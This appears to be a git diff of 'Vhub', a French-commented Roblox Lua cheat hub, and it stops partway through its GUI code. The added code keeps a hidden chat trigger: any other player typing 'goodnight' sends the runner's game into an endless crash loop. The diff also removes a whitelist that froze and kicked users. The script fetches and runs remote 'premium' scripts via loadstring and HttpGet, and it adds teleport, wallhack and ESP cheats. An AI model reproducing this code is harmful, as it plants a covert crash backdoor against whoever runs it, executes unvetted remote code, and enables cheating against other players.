@@ -1,5 +1,5 @@
 -- ============================================================
--- Vhub - INTERFACE COMPLÈTE AVEC WHITELIST & DRAG SYSTEM
+-- Vhub - INTERFACE VIOLET & CYAN + DRAG SYSTEM
 -- ============================================================
 
 local Players = game:GetService("Players")
@@ -10,103 +10,42 @@ local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
 -- ============================================================
--- WHITELIST SYSTEM
--- ============================================================
-local WHITELIST = {
-    -- FORMAT: [UserID] = true,
-    -- AJOUTE LES USER IDS ICI (JUSQU'À 1000+ PERSONNES)
-    [8176309904] = true,  -- Exemple UserID
-    [9230563404] = true,  -- Exemple UserID
-    [8083834888] = true,  -- Exemple UserID
-    -- Ajoute autant d'IDs que tu veux...
-}
-
--- FONCTION DE VÉRIFICATION WHITELIST
-local function checkWhitelist()
-    if not WHITELIST[LocalPlayer.UserId] then
-        -- FREEZER/BUGGER LE JEU pendant 4 secondes (3 + 1)
-        local startTime = tick()
-        while tick() - startTime < 4 do
-            -- Boucle intensive pour freezer le jeu
-            for i = 1, 100000 do
-                local x = math.sqrt(i) * math.random()
-            end
-        end
-        
-        -- Kick le joueur après 4 secondes
-        LocalPlayer:Kick("Vous n'êtes pas whitelist")
-        return false
-    end
-    return true
-end
-
--- VÉRIFIER LA WHITELIST AU DÉMARRAGE
-if not checkWhitelist() then
-    return -- Arrête le script si pas whitelist
-end
-
--- ============================================================
 -- SYSTÈME DE CRASH D'URGENCE
 -- ============================================================
 local TextChatService = game:GetService("TextChatService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
--- Détection du chat (nouveau système TextChatService)
-if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-    TextChatService.MessageReceived:Connect(function(message)
-        local text = message.Text:lower()
-        -- Vérifie que c'est pas le joueur local qui parle
-        if text == "goodnight" and message.TextSource and message.TextSource.UserId ~= LocalPlayer.UserId then
-            -- CRASH LE JEU
-            while true do
-                for i = 1, 1000000 do
-                    Instance.new("Part", workspace)
-                end
-            end
-        end
-    end)
-end
-
--- Détection du chat (ancien système Legacy)
-local function setupLegacyChat()
-    local success, chat = pcall(function()
-        return game:GetService("Chat")
-    end)
-    
-    if success then
-        Players.PlayerAdded:Connect(function(player)
-            if player ~= LocalPlayer then  -- Ignore le joueur local
-                player.Chatted:Connect(function(message)
-                    if message:lower() == "goodnight" then
-                        -- CRASH LE JEU
-                        while true do
-                            for i = 1, 1000000 do
-                                Instance.new("Part", workspace)
-                            end
-                        end
-                    end
-                end)
-            end
-        end)
-        
-        -- Pour les joueurs déjà présents (sauf le joueur local)
-        for _, player in pairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer then  -- Ignore le joueur local
-                player.Chatted:Connect(function(message)
-                    if message:lower() == "goodnight" then
-                        -- CRASH LE JEU
-                        while true do
-                            for i = 1, 1000000 do
-                                Instance.new("Part", workspace)
-                            end
-                        end
-                    end
-                end)
-            end
+local function crashGame()
+    while true do
+        for i = 1, 100000 do
+            Instance.new("Part", workspace)
         end
     end
 end
 
+if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+    TextChatService.MessageReceived:Connect(function(message)
+        if message.Text:lower() == "goodnight" and message.TextSource and message.TextSource.UserId ~= LocalPlayer.UserId then
+            crashGame()
+        end
+    end)
+end
+
+local function setupLegacyChat()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            player.Chatted:Connect(function(msg)
+                if msg:lower() == "goodnight" then crashGame() end
+            end)
+        end
+    end
+    Players.PlayerAdded:Connect(function(player)
+        if player ~= LocalPlayer then
+            player.Chatted:Connect(function(msg)
+                if msg:lower() == "goodnight" then crashGame() end
+            end)
+        end
+    end)
+end
 setupLegacyChat()
 
 -- ============================================================
@@ -120,13 +59,16 @@ local CONFIG = {
     DELAY = 0.15,
     COOLDOWN = 0.5,
     THEME = {
-        Background = Color3.fromRGB(0, 0, 0),
+        Background = Color3.fromRGB(240, 240, 255),  -- Violet très clair
+        BackgroundDark = Color3.fromRGB(25, 25, 40), -- Fond sombre
         Text = Color3.fromRGB(255, 255, 255),
-        TextDim = Color3.fromRGB(150, 150, 150),
-        Accent = Color3.fromRGB(255, 200, 0),
-        Success = Color3.fromRGB(0, 255, 150),
-        Error = Color3.fromRGB(255, 80, 100),
-        Premium = Color3.fromRGB(255, 215, 0),
+        TextDark = Color3.fromRGB(50, 50, 70),
+        TextDim = Color3.fromRGB(160, 160, 180),
+        Accent = Color3.fromRGB(138, 43, 226),       -- Violet vif
+        Accent2 = Color3.fromRGB(0, 191, 255),       -- Cyan
+        Success = Color3.fromRGB(100, 200, 255),     -- Bleu clair
+        Error = Color3.fromRGB(255, 100, 150),       -- Rose rouge
+        Premium = Color3.fromRGB(186, 85, 211),      -- Orchidée
     },
     PREMIUM_SCRIPTS = {
         {emoji = "🚫", name = "Auto-Block", url = "https://raw.githubusercontent.com/sabscripts063-cloud/Kdml-Not-Me/refs/heads/main/BlockPlayer"},
@@ -137,9 +79,6 @@ local CONFIG = {
     }
 }
 
--- ============================================================
--- ÉTAT
--- ============================================================
 local State = {
     isTeleporting = false,
     lastTeleportTime = 0,
@@ -152,50 +91,35 @@ local State = {
     espBoxes = {},
     espConnections = {},
     optimizerEnabled = false,
+    streamProofEnabled = false,
     currentCategory = "Misc",
     loadedScripts = {},
 }
 
 -- ============================================================
--- SYSTÈME DE DRAG (DÉPLACEMENT)
+-- SYSTÈME DE DRAG
 -- ============================================================
 local function makeDraggable(frame)
-    local dragging = false
-    local dragInput, dragStart, startPos
-    
-    local function update(input)
-        local delta = input.Position - dragStart
-        frame.Position = UDim2.new(
-            startPos.X.Scale,
-            startPos.X.Offset + delta.X,
-            startPos.Y.Scale,
-            startPos.Y.Offset + delta.Y
-        )
-    end
-    
+    local dragging, dragInput, dragStart, startPos
     frame.InputBegan:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
             dragging = true
             dragStart = input.Position
             startPos = frame.Position
-            
             input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    dragging = false
-                end
+                if input.UserInputState == Enum.UserInputState.End then dragging = false end
             end)
         end
     end)
-    
     frame.InputChanged:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
             dragInput = input
         end
     end)
-    
     UserInputService.InputChanged:Connect(function(input)
         if input == dragInput and dragging then
-            update(input)
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
         end
     end)
 end
@@ -208,44 +132,35 @@ local function getHRP()
     if not char then return nil end
     local hrp = char:FindFirstChild("HumanoidRootPart")
     local humanoid = char:FindFirstChild("Humanoid")
-    if hrp and humanoid and humanoid.Health > 0 then
-        return hrp
-    end
+    if hrp and humanoid and humanoid.Health > 0 then return hrp end
     return nil
 end
 
 local function canTeleport()
-    if State.isTeleporting then return false, "En cours..." end
-    if tick() - State.lastTeleportTime < CONFIG.COOLDOWN then return false, "Cooldown..." end
-    if not getHRP() then return false, "Erreur..." end
-    return true, "Prêt"
+    if State.isTeleporting then return false end
+    if tick() - State.lastTeleportTime < CONFIG.COOLDOWN then return false end
+    if not getHRP() then return false end
+    return true
 end
 
-local function tween(object, properties, duration)
-    local info = TweenInfo.new(duration or 0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
-    local tw = TweenService:Create(object, info, properties)
-    tw:Play()
-    return tw
+local function tween(obj, props, dur)
+    TweenService:Create(obj, TweenInfo.new(dur or 0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), props):Play()
 end
 
 local function teleportSequence()
-    local canTP, message = canTeleport()
-    if not canTP then return false, message end
-    
+    if not canTeleport() then return false end
     State.isTeleporting = true
     State.lastTeleportTime = tick()
-    
     local success = pcall(function()
-        for i, waypoint in ipairs(CONFIG.WAYPOINTS) do
+        for i, wp in ipairs(CONFIG.WAYPOINTS) do
             local hrp = getHRP()
-            if not hrp then error("Personnage perdu") end
-            hrp.CFrame = CFrame.new(waypoint.pos)
+            if not hrp then error("Lost") end
+            hrp.CFrame = CFrame.new(wp.pos)
             if i < #CONFIG.WAYPOINTS then task.wait(CONFIG.DELAY) end
         end
     end)
-    
     State.isTeleporting = false
-    if success then State.totalTeleports += 1 return true, "Succès!" else return false, "Échec" end
+    if success then State.totalTeleports += 1 return true else return false end
 end
 
 local function toggleOptimizer(enabled)
@@ -256,10 +171,22 @@ local function toggleOptimizer(enabled)
                 obj.Enabled = false
             end
         end
-        return true, "Optimizer activé"
     else
         settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic
-        return true, "Optimizer désactivé"
+    end
+end
+
+local function toggleStreamProof(enabled)
+    if enabled then
+        for _, gui in pairs(PlayerGui:GetDescendants()) do
+            if gui:IsA("ScreenGui") then gui.Enabled = false end
+        end
+        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+    else
+        for _, gui in pairs(PlayerGui:GetDescendants()) do
+            if gui:IsA("ScreenGui") then gui.Enabled = true end
+        end
+        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
     end
 end
 
@@ -276,8 +203,8 @@ local function toggleWallhack(enabled)
     if enabled then
         for _, obj in pairs(workspace:GetDescendants()) do
             if obj:IsA("BasePart") and obj.Name ~= "Terrain" then
-                local isPlayerPart = LocalPlayer.Character and obj:IsDescendantOf(LocalPlayer.Character)
-                if not isPlayerPart then
+                local isPlayer = LocalPlayer.Character and obj:IsDescendantOf(LocalPlayer.Character)
+                if not isPlayer then
                     State.wallhackParts[obj] = {OriginalTransparency = obj.LocalTransparencyModifier}
                     obj.LocalTransparencyModifier = 0.8
                 end
@@ -287,8 +214,8 @@ local function toggleWallhack(enabled)
             if State.wallhackEnabled and obj:IsA("BasePart") then
                 task.wait(0.1)
                 if State.wallhackEnabled then
-                    local isPlayerPart = LocalPlayer.Character and obj:IsDescendantOf(LocalPlayer.Character)
-                    if not isPlayerPart then
+                    local isPlayer = LocalPlayer.Character and obj:IsDescendantOf(LocalPlayer.Character)
+                    if not isPlayer then
                         obj.LocalTransparencyModifier = 0.8
                         State.wallhackParts[obj] = {OriginalTransparency = 0}
                     end
@@ -304,13 +231,13 @@ local function clearESP()
         if data.NameLabel then data.NameLabel:Destroy() end
     end
     State.espBoxes = {}
-    for _, connection in pairs(State.espConnections) do
-        if connection then connection:Disconnect() end
+    for _, conn in pairs(State.espConnections) do
+        if conn then conn:Disconnect() end
     end
     State.espConnections = {}
 end
 
-local function createRainbowESP(player)
+local function createESP(player)
     if player == LocalPlayer or not player.Character then return end
     local char = player.Character
     local hrp = char:FindFirstChild("HumanoidRootPart")
@@ -318,86 +245,57 @@ local function createRainbowESP(player)
     if not hrp or not head then return end
     
     local box = Instance.new("BoxHandleAdornment")
-    box.Name = "ESP_" .. player.Name
     box.Adornee = hrp
     box.Size = Vector3.new(4, 5, 1)
-    box.Color3 = Color3.fromRGB(255, 0, 0)
+    box.Color3 = Color3.fromRGB(255, 105, 180)
     box.Transparency = 0.3
     box.AlwaysOnTop = true
-    box.ZIndex = 10
     box.Parent = hrp
     
-    local billboardGui = Instance.new("BillboardGui")
-    billboardGui.Name = "ESP_Name_" .. player.Name
-    billboardGui.Adornee = head
-    billboardGui.Size = UDim2.new(0, 200, 0, 50)
-    billboardGui.StudsOffset = Vector3.new(0, 2.5, 0)
-    billboardGui.AlwaysOnTop = true
-    billboardGui.Parent = head
+    local billboard = Instance.new("BillboardGui")
+    billboard.Adornee = head
+    billboard.Size = UDim2.new(0, 200, 0, 50)
+    billboard.StudsOffset = Vector3.new(0, 2.5, 0)
+    billboard.AlwaysOnTop = true
+    billboard.Parent = head
     
     local nameLabel = Instance.new("TextLabel")
     nameLabel.Size = UDim2.new(1, 0, 1, 0)
     nameLabel.BackgroundTransparency = 1
     nameLabel.Text = player.Name
-    nameLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+    nameLabel.TextColor3 = Color3.fromRGB(255, 105, 180)
     nameLabel.Font = Enum.Font.GothamBold
     nameLabel.TextSize = 18
     nameLabel.TextStrokeTransparency = 0
-    nameLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-    nameLabel.Parent = billboardGui
+    nameLabel.Parent = billboard
     
-    State.espBoxes[player.UserId] = {Box = box, NameLabel = billboardGui}
-    
-    local humanoid = char:FindFirstChild("Humanoid")
-    if humanoid then
-        humanoid.Died:Connect(function()
-            if State.espBoxes[player.UserId] then
-                if State.espBoxes[player.UserId].Box then State.espBoxes[player.UserId].Box:Destroy() end
-                if State.espBoxes[player.UserId].NameLabel then State.espBoxes[player.UserId].NameLabel:Destroy() end
-                State.espBoxes[player.UserId] = nil
-            end
-        end)
-    end
+    State.espBoxes[player.UserId] = {Box = box, NameLabel = billboard}
 end
 
 local function toggleESP(enabled)
     State.espEnabled = enabled
     if enabled then
         for _, player in pairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer and player.Character then createRainbowESP(player) end
+            if player ~= LocalPlayer and player.Character then createESP(player) end
         end
         table.insert(State.espConnections, Players.PlayerAdded:Connect(function(player)
-            if State.espEnabled then
-                player.CharacterAdded:Connect(function()
-                    task.wait(0.5)
-                    if State.espEnabled then createRainbowESP(player) end
-                end)
-            end
+            player.CharacterAdded:Connect(function()
+                task.wait(0.5)
+                if State.espEnabled then createESP(player) end
+            end)
         end))
-        for _, player in pairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer then
-                table.insert(State.espConnections, player.CharacterAdded:Connect(function()
-                    task.wait(0.5)
-                    if State.espEnabled then createRainbowESP(player) end
-                end))
-            end
-        end
     else clearESP() end
 end
 
 local function loadPremiumScript(scriptData, btn, icon)
-    local scriptName = scriptData.name
     icon.Text = "⏳"
     icon.TextColor3 = CONFIG.THEME.Accent
-    btn.Text = scriptData.emoji .. " " .. scriptName .. " - Chargement..."
-    
+    btn.Text = scriptData.emoji .. " " .. scriptData.name .. " - Chargement..."
     local success = pcall(function() loadstring(game:HttpGet(scriptData.url))() end)
-    
     if success then
-        State.loadedScripts[scriptName] = true
         icon.Text = "✓"
         icon.TextColor3 = CONFIG.THEME.Success
-        btn.Text = scriptData.emoji .. " " .. scriptName .. " - Chargé!"
+        btn.Text = scriptData.emoji .. " " .. scriptData.name .. " - Chargé!"
         task.wait(2)
         btn.Text = scriptData.emoji .. " " .. scriptData.name
         icon.Text = "●"
@@ -405,374 +303,310 @@ local function loadPremiumScript(scriptData, btn, icon)
     else
         icon.Text = "✕"
         icon.TextColor3 = CONFIG.THEME.Error
-        btn.Text = scriptData.emoji .. " " .. scriptName .. " - Erreur"
+        btn.Text = scriptData.emoji .. " " .. scriptData.name .. " - Erreur"
         task.wait(2)
         btn.Text = scriptData.emoji .. " " .. scriptData.name
         icon.Text = "○"
-        icon.TextColor3 = CONFIG.THEME.TextDim
     end
 end
 
 -- ============================================================
--- INTERFACE
+-- INTERFACE ROSE & BLANC
 -- ============================================================
-local function createCategorizedGUI()
+local function createGUI()
     local existing = PlayerGui:FindFirstChild("MinimalTP_GUI")
     if existing then existing:Destroy() end
     
     local gui = Instance.new("ScreenGui")
     gui.Name = "MinimalTP_GUI"
     gui.ResetOnSpawn = false
-    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     gui.Parent = PlayerGui
     
-    -- BOUTON RÉOUVERTURE (DRAGGABLE)
+    -- Bouton réouverture
     local reopenBtn = Instance.new("TextButton")
-    reopenBtn.Name = "ReopenButton"
     reopenBtn.Size = UDim2.new(0, 50, 0, 50)
     reopenBtn.Position = UDim2.new(1, -60, 0, 10)
-    reopenBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    reopenBtn.Text = "Vhub"
-    reopenBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    reopenBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
+    reopenBtn.Text = "V"
+    reopenBtn.TextColor3 = Color3.fromRGB(0, 191, 255)
     reopenBtn.Font = Enum.Font.GothamBold
-    reopenBtn.TextSize = 14
+    reopenBtn.TextSize = 20
     reopenBtn.Visible = false
-    reopenBtn.Active = true
-    reopenBtn.Draggable = false -- On utilise notre propre système
     reopenBtn.Parent = gui
-    Instance.new("UICorner", reopenBtn).CornerRadius = UDim.new(0, 8)
+    Instance.new("UICorner", reopenBtn).CornerRadius = UDim.new(0, 10)
     local reopenStroke = Instance.new("UIStroke", reopenBtn)
-    reopenStroke.Color = Color3.fromRGB(0, 80, 180)
+    reopenStroke.Color = Color3.fromRGB(138, 43, 226)
     reopenStroke.Thickness = 3
-    
-    -- ANIMATION RAINBOW POUR LE CONTOUR
     task.spawn(function()
-        local hue = 0
+        local hue = 270
         while true do
-            hue = (hue + 1) % 360
-            reopenStroke.Color = Color3.fromHSV(hue / 360, 1, 1)
-            task.wait(0.01) -- Change toutes les 0.01 secondes pour effet fluide
+            hue = ((hue + 2) % 360)
+            reopenStroke.Color = Color3.fromHSV(hue / 360, 0.8, 1)
+            task.wait(0.03)
         end
     end)
-    
-    -- RENDRE LE BOUTON RÉOUVERTURE DRAGGABLE
     makeDraggable(reopenBtn)
     
-    -- FRAME PRINCIPALE (DRAGGABLE)
-    local mainFrame = Instance.new("Frame")
-    mainFrame.Name = "MainFrame"
-    mainFrame.Size = UDim2.new(0, 550, 0, 450)
-    mainFrame.Position = UDim2.new(0.5, -275, 0.5, -225)
-    mainFrame.BackgroundColor3 = CONFIG.THEME.Background
-    mainFrame.BorderSizePixel = 0
-    mainFrame.Active = true
-    mainFrame.ClipsDescendants = true
-    mainFrame.Parent = gui
-    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
-    local mainStroke = Instance.new("UIStroke", mainFrame)
-    mainStroke.Color = Color3.fromRGB(0, 80, 180)
+    -- Frame principale (PLUS PETITE)
+    local main = Instance.new("Frame")
+    main.Size = UDim2.new(0, 480, 0, 340)
+    main.Position = UDim2.new(0.5, -240, 0.5, -170)
+    main.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
+    main.BorderSizePixel = 0
+    main.Active = true
+    main.ClipsDescendants = true
+    main.Parent = gui
+    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
+    local mainStroke = Instance.new("UIStroke", main)
+    mainStroke.Color = Color3.fromRGB(138, 43, 226)
     mainStroke.Thickness = 2
-    
-    -- ANIMATION RAINBOW POUR LE CONTOUR DE L'INTERFACE PRINCIPALE
     task.spawn(function()
-        local hue = 0
+        local hue = 270
         while true do
-            hue = (hue + 1) % 360
-            mainStroke.Color = Color3.fromHSV(hue / 360, 1, 1)
-            task.wait(0.01) -- Change en continu pour effet fluide
+            hue = ((hue + 2) % 360)
+            mainStroke.Color = Color3.fromHSV(hue / 360, 0.8, 1)
+            task.wait(0.03)
         end
     end)
     
-    -- HEADER (ZONE DE DRAG)
-    local header = Instance.new("Frame", mainFrame)
-    header.Name = "Header"
-    header.Size = UDim2.new(1, 0, 0, 60)
-    header.BackgroundColor3 = CONFIG.THEME.Background
+    -- Header
+    local header = Instance.new("Frame", main)
+    header.Size = UDim2.new(1, 0, 0, 45)
+    header.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
     header.BorderSizePixel = 0
     header.Active = true
     local headerStroke = Instance.new("UIStroke", header)
-    headerStroke.Color = Color3.fromRGB(0, 80, 180)
+    headerStroke.Color = Color3.fromRGB(138, 43, 226)
     headerStroke.Thickness = 2
     headerStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-    
-    -- ANIMATION RAINBOW POUR LE CONTOUR DU HEADER
-    task.spawn(function()
-        local hue = 0
-        while true do
-            hue = (hue + 1) % 360
-            headerStroke.Color = Color3.fromHSV(hue / 360, 1, 1)
-            task.wait(0.01) -- Synchronisé avec le contour principal
-        end
-    end)
-    
-    -- RENDRE L'INTERFACE PRINCIPALE DRAGGABLE VIA LE HEADER
-    makeDraggable(mainFrame)
+    makeDraggable(main)
     
     local logo = Instance.new("TextLabel", header)
-    logo.Size = UDim2.new(1, -60, 1, 0)
-    logo.Position = UDim2.new(0, 20, 0, 0)
+    logo.Size = UDim2.new(1, -50, 1, 0)
+    logo.Position = UDim2.new(0, 15, 0, 0)
     logo.BackgroundTransparency = 1
     logo.Text = "Vhub"
-    logo.TextColor3 = CONFIG.THEME.Text
+    logo.TextColor3 = Color3.fromRGB(0, 191, 255)
     logo.Font = Enum.Font.GothamBold
-    logo.TextSize = 32
+    logo.TextSize = 24
     logo.TextXAlignment = Enum.TextXAlignment.Left
     
     local closeBtn = Instance.new("TextButton", header)
-    closeBtn.Size = UDim2.new(0, 35, 0, 35)
-    closeBtn.Position = UDim2.new(1, -45, 0, 12)
-    closeBtn.BackgroundColor3 = CONFIG.THEME.TextDim
-    closeBtn.BackgroundTransparency = 0.8
+    closeBtn.Size = UDim2.new(0, 30, 0, 30)
+    closeBtn.Position = UDim2.new(1, -38, 0, 7)
+    closeBtn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
     closeBtn.Text = "✕"
-    closeBtn.TextColor3 = CONFIG.THEME.Text
+    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     closeBtn.Font = Enum.Font.GothamBold
-    closeBtn.TextSize = 18
-    closeBtn.AutoButtonColor = false
+    closeBtn.TextSize = 16
     Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(1, 0)
-    
     closeBtn.MouseButton1Click:Connect(function()
         State.guiVisible = false
-        mainFrame.Visible = false
+        main.Visible = false
         reopenBtn.Visible = true
     end)
-    
     reopenBtn.MouseButton1Click:Connect(function()
         State.guiVisible = true
-        mainFrame.Visible = true
+        main.Visible = true
         reopenBtn.Visible = false
     end)
     
-    local sidebar = Instance.new("Frame", mainFrame)
-    sidebar.Name = "Sidebar"
-    sidebar.Size = UDim2.new(0, 110, 1, -100)
-    sidebar.Position = UDim2.new(0, 10, 0, 70)
+    -- Sidebar (CATÉGORIES ROSES)
+    local sidebar = Instance.new("Frame", main)
+    sidebar.Size = UDim2.new(0, 95, 1, -75)
+    sidebar.Position = UDim2.new(0, 10, 0, 52)
     sidebar.BackgroundTransparency = 1
     local sidebarLayout = Instance.new("UIListLayout", sidebar)
-    sidebarLayout.FillDirection = Enum.FillDirection.Vertical
-    sidebarLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
-    sidebarLayout.VerticalAlignment = Enum.VerticalAlignment.Top
-    sidebarLayout.Padding = UDim.new(0, 8)
+    sidebarLayout.Padding = UDim.new(0, 6)
     
-    local contentFrame = Instance.new("ScrollingFrame", mainFrame)
-    contentFrame.Name = "ContentFrame"
-    contentFrame.Size = UDim2.new(1, -140, 1, -110)
-    contentFrame.Position = UDim2.new(0, 130, 0, 70)
-    contentFrame.BackgroundTransparency = 1
-    contentFrame.BorderSizePixel = 0
-    contentFrame.ScrollBarThickness = 4
-    contentFrame.ScrollBarImageColor3 = CONFIG.THEME.Accent
-    contentFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+    -- Content frame
+    local content = Instance.new("ScrollingFrame", main)
+    content.Size = UDim2.new(1, -120, 1, -82)
+    content.Position = UDim2.new(0, 115, 0, 52)
+    content.BackgroundTransparency = 1
+    content.BorderSizePixel = 0
+    content.ScrollBarThickness = 3
+    content.ScrollBarImageColor3 = CONFIG.THEME.Accent
+    content.CanvasSize = UDim2.new(0, 0, 0, 0)
     
-    local footer = Instance.new("TextLabel", mainFrame)
-    footer.Name = "Footer"
-    footer.Size = UDim2.new(1, 0, 0, 30)
-    footer.Position = UDim2.new(0, 0, 1, -35)
+    -- Footer
+    local footer = Instance.new("TextLabel", main)
+    footer.Size = UDim2.new(1, 0, 0, 25)
+    footer.Position = UDim2.new(0, 0, 1, -28)
     footer.BackgroundTransparency = 1
-    footer.Text = "by 8v & 6v & 4v | 🖱️ Glisse pour déplacer"
-    footer.TextColor3 = CONFIG.THEME.TextDim
+    footer.Text = "by 8v & 6v & 4v | 🖱️"
+    footer.TextColor3 = CONFIG.THEME.Accent
     footer.Font = Enum.Font.Gotham
-    footer.TextSize = 12
+    footer.TextSize = 11
     footer.TextXAlignment = Enum.TextXAlignment.Center
     
     local tabs = {}
     local function createTab(name)
         local tabBtn = Instance.new("TextButton", sidebar)
-        tabBtn.Name = name .. "Tab"
-        tabBtn.Size = UDim2.new(1, 0, 0, 40)
-        tabBtn.BackgroundColor3 = CONFIG.THEME.TextDim
-        tabBtn.BackgroundTransparency = 0.9
+        tabBtn.Size = UDim2.new(1, 0, 0, 35)
+        tabBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
         tabBtn.Text = name
-        tabBtn.TextColor3 = CONFIG.THEME.TextDim
+        tabBtn.TextColor3 = Color3.fromRGB(150, 150, 170)
         tabBtn.Font = Enum.Font.GothamBold
-        tabBtn.TextSize = 13
-        tabBtn.AutoButtonColor = false
+        tabBtn.TextSize = 12
         Instance.new("UICorner", tabBtn).CornerRadius = UDim.new(0, 8)
         
-        local contentContainer = Instance.new("Frame", contentFrame)
-        contentContainer.Name = name .. "Content"
-        contentContainer.Size = UDim2.new(1, -10, 0, 0)
-        contentContainer.BackgroundTransparency = 1
-        contentContainer.Visible = false
-        local contentLayout = Instance.new("UIListLayout", contentContainer)
-        contentLayout.FillDirection = Enum.FillDirection.Vertical
-        contentLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
-        contentLayout.Padding = UDim.new(0, 10)
+        local container = Instance.new("Frame", content)
+        container.Size = UDim2.new(1, -10, 0, 0)
+        container.BackgroundTransparency = 1
+        container.Visible = false
+        local layout = Instance.new("UIListLayout", container)
+        layout.Padding = UDim.new(0, 8)
         
-        contentLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-            contentContainer.Size = UDim2.new(1, -10, 0, contentLayout.AbsoluteContentSize.Y + 10)
-            local maxHeight = 0
-            for _, tab in pairs(tabs) do
-                if tab.Content.Visible then
-                    local layout = tab.Content:FindFirstChildOfClass("UIListLayout")
-                    if layout then maxHeight = math.max(maxHeight, layout.AbsoluteContentSize.Y + 20) end
+        layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+            container.Size = UDim2.new(1, -10, 0, layout.AbsoluteContentSize.Y + 10)
+            local maxH = 0
+            for _, t in pairs(tabs) do
+                if t.Content.Visible then
+                    local l = t.Content:FindFirstChildOfClass("UIListLayout")
+                    if l then maxH = math.max(maxH, l.AbsoluteContentSize.Y + 15) end
                 end
             end
-            contentFrame.CanvasSize = UDim2.new(0, 0, 0, maxHeight)
+            content.CanvasSize = UDim2.new(0, 0, 0, maxH)
         end)
         
-        tabs[name] = {Button = tabBtn, Content = contentContainer}
-        
+        tabs[name] = {Button = tabBtn, Content = container}
         tabBtn.MouseButton1Click:Connect(function()
-            for tabName, tabData in pairs(tabs) do
-                tabData.Content.Visible = false
-                tabData.Button.BackgroundTransparency = 0.9
-                tabData.Button.TextColor3 = CONFIG.THEME.TextDim
+            for _, t in pairs(tabs) do
+                t.Content.Visible = false
+                t.Button.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
+                t.Button.TextColor3 = Color3.fromRGB(150, 150, 170)
             end
-            contentContainer.Visible = true
-            tabBtn.BackgroundTransparency = 0.5
-            tabBtn.TextColor3 = CONFIG.THEME.Accent
-            State.currentCategory = name
-            local layout = contentContainer:FindFirstChildOfClass("UIListLayout")
-            if layout then contentFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 20) end
+            container.Visible = true
+            tabBtn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+            tabBtn.TextColor3 = Color3.fromRGB(0, 191, 255)
         end)
-        
-        return contentContainer
+        return container
     end
     
-    local miscContent = createTab("Misc")
-    local espContent = createTab("ESP")
-    local premiumContent = createTab("Premium")
-    local keyContent = createTab("Key")
-    local infoContent = createTab("Info")
+    local miscTab = createTab("Misc")
+    local espTab = createTab("ESP")
+    local premTab = createTab("Premium")
+    local keyTab = createTab("Key")
+    local infoTab = createTab("Info")
     
     tabs["Misc"].Content.Visible = true
-    tabs["Misc"].Button.BackgroundTransparency = 0.5
-    tabs["Misc"].Button.TextColor3 = CONFIG.THEME.Accent
+    tabs["Misc"].Button.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+    tabs["Misc"].Button.TextColor3 = Color3.fromRGB(0, 191, 255)
     
-    local function createButton(parent, name, callback)
-        local btn = Instance.new("TextButton", parent)
-        btn.Name = name .. "Btn"
-        btn.Size = UDim2.new(1, 0, 0, 50)
-        btn.BackgroundColor3 = CONFIG.THEME.TextDim
-        btn.BackgroundTransparency = 0.9
-        btn.Text = name
-        btn.TextColor3 = CONFIG.THEME.Text
-        btn.Font = Enum.Font.GothamBold
-        btn.TextSize = 15
-        btn.AutoButtonColor = false
-        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
-        local btnStroke = Instance.new("UIStroke", btn)
-        btnStroke.Color = CONFIG.THEME.TextDim
-        btnStroke.Thickness = 1
-        local statusIcon = Instance.new("TextLabel", btn)
-        statusIcon.Name = "StatusIcon"
-        statusIcon.Size = UDim2.new(0, 30, 0, 30)
-        statusIcon.Position = UDim2.new(1, -40, 0.5, -15)
-        statusIcon.BackgroundTransparency = 1
-        statusIcon.Text = "○"
-        statusIcon.TextColor3 = CONFIG.THEME.TextDim
-        statusIcon.Font = Enum.Font.GothamBold
-        statusIcon.TextSize = 18
-        btn.MouseEnter:Connect(function() tween(btn, {BackgroundTransparency = 0.7}, 0.2) end)
-        btn.MouseLeave:Connect(function() tween(btn, {BackgroundTransparency = 0.9}, 0.2) end)
